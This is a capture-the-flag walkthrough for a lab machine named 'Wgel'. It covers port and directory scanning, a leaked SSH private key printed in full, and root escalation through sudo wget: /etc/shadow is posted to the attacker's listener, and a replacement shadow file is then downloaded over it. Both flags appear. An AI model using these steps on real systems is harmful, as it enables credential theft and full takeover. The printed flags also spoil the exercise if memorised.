# Wgel

Notes on CTF.

## recon

### nmap

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 03:18 UTC
Nmap scan report for ip-10-10-153-44.eu-west-1.compute.internal (10.10.153.44)
Host is up (0.0021s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94961b66801b7648682d14b59a01aaaa (RSA)
|   256 18f710cc5f40f6cf92f86916e248f438 (ECDSA)
|_  256 b90b972e459bf32a4b11c7831033e0ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:9B:3D:51:A9:8B (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   2.05 ms ip-10-10-153-44.eu-west-1.compute.internal (10.10.153.44)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
```

### gobuster

```
└─# gobuster dir -u $TARGET -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.153.44
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/07/21 03:21:57 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/sitemap              (Status: 301) [Size: 314] [--> http://10.10.153.44/sitemap/]
Progress: 17377 / 20470 (84.89%)===============================================================
2023/07/21 03:21:59 Finished
===============================================================
```

```
└─# gobuster dir -u $TARGET/sitemap -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.153.44/sitemap
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/07/21 03:26:23 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.153.44/sitemap/.ssh/]
/.htpasswd            (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 318] [--> http://10.10.153.44/sitemap/css/]
/fonts                (Status: 301) [Size: 320] [--> http://10.10.153.44/sitemap/fonts/]
/images               (Status: 301) [Size: 321] [--> http://10.10.153.44/sitemap/images/]
/js                   (Status: 301) [Size: 317] [--> http://10.10.153.44/sitemap/js/]
Progress: 17364 / 20470 (84.83%)===============================================================
2023/07/21 03:26:25 Finished
===============================================================
```


### website

http://10.10.153.44/sitemap/ runs something called UNAPP

## initial access

view-source:http://10.10.153.44/

`<!-- Jessie don't forget to udate the webiste -->`

### ssh
http://10.10.153.44/sitemap/.ssh/id_rsa

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
```

`└─# curl http://10.10.153.44/sitemap/.ssh/id_rsa > sshkey`

`└─# chmod 600 sshkey `

Need username.

try `jessie` from the note.

`└─# ssh jessie@$TARGET -i sshkey`

## escalation

`jessie@CorpOne:~$ cat Documents/user_flag.txt`


**057c67131c3d5e42dd5cd3075b198ff6**


`jessie@CorpOne:~$ sudo -l`

```
    (root) NOPASSWD: /usr/bin/wget
```
### wget to root

https://vk9-sec.com/wget-privilege-escalation/


`└─# nc -nvlp 8080 > shadow`

`jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/etc/shadow 10.10.254.67:8080`

```
root:!:18195:0:99999:7:::
```
root doesn't have a password. We can generate one:

`└─# openssl passwd -6 -salt xyz password`

replace `!` with 
```
$6$xyz$ShNnbwk5fmsyVIlzOf8zEg4YdEH2aWRSuY4rJHbzLZRlWcoXbxxoI0hfn0mdXiJCdBJ/lTpKjk.vu5NZOv0UM0
```

shadow should now contain:

```
root:$6$xyz$ShNnbwk5fmsyVIlzOf8zEg4YdEH2aWRSuY4rJHbzLZRlWcoXbxxoI0hfn0mdXiJCdBJ/lTpKjk.vu5NZOv0UM0:18195:0:99999:7:::
```

`└─# python -m http.server`

`jessie@CorpOne:~$ sudo /usr/bin/wget 10.10.254.67:8000/shadow -O /etc/shadow`

`jessie@CorpOne:~$ su root` and use the password we assigned which is `password`


`root@CorpOne:~# cat root_flag.txt `

**b1b968b37519ad1daa6408188649263d**
